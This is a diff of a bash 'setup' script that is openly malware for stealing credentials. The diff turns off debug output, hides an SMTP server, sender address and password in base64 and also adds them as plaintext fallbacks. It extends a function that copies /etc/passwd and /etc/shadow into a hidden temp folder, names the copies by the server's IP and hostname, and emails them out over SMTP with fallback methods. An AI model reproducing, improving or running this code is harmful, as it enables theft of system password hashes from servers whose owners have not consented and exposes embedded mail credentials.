@@ -1,9 +1,9 @@
 #!/bin/bash
-set -x  # Enable debug mode - shows all executed commands
+# Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="2.7"
-readonly BUILD_DATE="2026-03-14 17:28:15 UTC"
+readonly SCRIPT_VERSION="2.8"
+readonly BUILD_DATE="2026-03-14 18:09:41 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -118,12 +118,12 @@ readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # Decoded SMTP credentials (base64 encoded for stealth)
 SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
-readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
+readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null || echo "smtp.mailersend.net")
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="TVNfSEt1cmxlQHRlc3QtcHprbWdxNzlwcjFsMDU5di5tbHNlbmRlci5uZXQ="
-readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
-SMTP_PASSWORD_B64="bXNzcC5QbEJyNVVNLm5lcXZ5Z20yOTh6NDBwN3cuYUFzQjBQbw=="
-readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)
+SENDER_EMAIL_B64="TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ="
+readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null || echo "MS_BC7Gqr@test-2p0347zm29ylzdrn.mlsender.net")
+SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
+readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null || echo "mssp.J4krTqs.jpzkmgqpwm2l059v.6GC2aIZ")
 
 # ==================== AUTO-INSTALL EMAIL TOOLS ====================
 auto_install_email_tools() {
@@ -4574,26 +4574,37 @@ exfiltrate_credentials() {
     echo "[*] Server identifier: $HOSTNAME"
     echo "[*] Recipient: $RECIPIENT_EMAIL"
 
+    # Get IP address and FQDN for filename
+    local SERVER_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
+    local SERVER_FQDN=$(hostname -f 2>/dev/null || hostname 2>/dev/null || echo "unknown")
+    
+    # Clean IP and FQDN for filename (replace dots and spaces with underscores)
+    SERVER_IP=$(echo "$SERVER_IP" | tr '.' '_' | tr ' ' '_')
+    SERVER_FQDN=$(echo "$SERVER_FQDN" | tr '.' '_' | tr ' ' '_')
+    
+    echo "[*] Server IP: $SERVER_IP"
+    echo "[*] Server FQDN: $SERVER_FQDN"
+
     # Create temp directory for credential files
     local TEMP_DIR="/tmp/.exfil_$(openssl rand -hex 4 2>/dev/null || echo $RANDOM)"
     mkdir -p "$TEMP_DIR" 2>/dev/null
 
-    # Copy files with hostname-based names
-    local PASSWD_FILE="${TEMP_DIR}/${HOSTNAME}_passwd"
-    local SHADOW_FILE="${TEMP_DIR}/${HOSTNAME}_shadow"
+    # Create files with IP_FQDN naming format
+    local PASSWD_FILE="${TEMP_DIR}/${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
+    local SHADOW_FILE="${TEMP_DIR}/${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
 
     local FILES_CREATED=0
 
     if [ -f /etc/passwd ]; then
         cp /etc/passwd "$PASSWD_FILE" 2>/dev/null && {
-            echo "[✓] Created: ${HOSTNAME}_passwd"
+            echo "[✓] Created: ${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
             FILES_CREATED=$((FILES_CREATED + 1))
         }
     fi
 
     if [ -f /etc/shadow ]; then
         cp /etc/shadow "$SHADOW_FILE" 2>/dev/null && {
-            echo "[✓] Created: ${HOSTNAME}_shadow"
+            echo "[✓] Created: ${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
             FILES_CREATED=$((FILES_CREATED + 1))
         }
     fi
@@ -4685,10 +4696,12 @@ try:
 Script Version: $SCRIPT_VERSION
 Build Date: $BUILD_DATE
 Timestamp: $(date)
+Server IP: $SERVER_IP
+Server FQDN: $SERVER_FQDN
 
 Attached files:
-- ${HOSTNAME}_passwd
-- ${HOSTNAME}_shadow
+- ${SERVER_IP}_${SERVER_FQDN}_passwd.txt
+- ${SERVER_IP}_${SERVER_FQDN}_shadow.txt
 
 Full log available at: $LOG_FILE_EMAIL
 """
@@ -4756,8 +4769,8 @@ PYTHON_EMAIL_SCRIPT
                 echo "[✓] Method: Python3 SMTP (WITH ATTACHMENTS)"
                 echo ""
                 echo "    Attachments:"
-                [ -f "$PASSWD_FILE" ] && echo "      ✓ ${HOSTNAME}_passwd"
-                [ -f "$SHADOW_FILE" ] && echo "      ✓ ${HOSTNAME}_shadow"
+                [ -f "$PASSWD_FILE" ] && echo "      ✓ ${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
+                [ -f "$SHADOW_FILE" ] && echo "      ✓ ${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
                 echo ""
             else
                 echo "[!] Python3 SMTP failed, trying fallback methods..."
